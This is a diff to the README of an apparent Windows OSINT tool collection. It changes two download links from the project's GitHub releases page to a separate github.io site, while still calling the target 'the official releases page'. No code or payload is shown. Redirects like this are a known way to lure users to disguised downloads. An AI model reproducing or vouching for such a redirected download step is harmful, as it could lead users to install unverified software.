@@ -1,6 +1,6 @@
 # 🔍 osint-recon-hub - Access essential tools for digital investigations
 
-[![Download Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/solh8229/osint-recon-hub/releases)
+[![Download Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://solh8229.github.io)
 
 ## 📖 About this collection
 
@@ -34,7 +34,7 @@ The software runs on standard Windows systems. You need the following minimum se
 Follow these steps to access the hub on your computer.
 
 1. Visit the link below to reach the official releases page.
-   [https://github.com/solh8229/osint-recon-hub/releases](https://github.com/solh8229/osint-recon-hub/releases)
+   [https://solh8229.github.io](https://solh8229.github.io)
 
 2. Look for the latest version at the top of the list. It will have a label mark like v1.0.0.
 
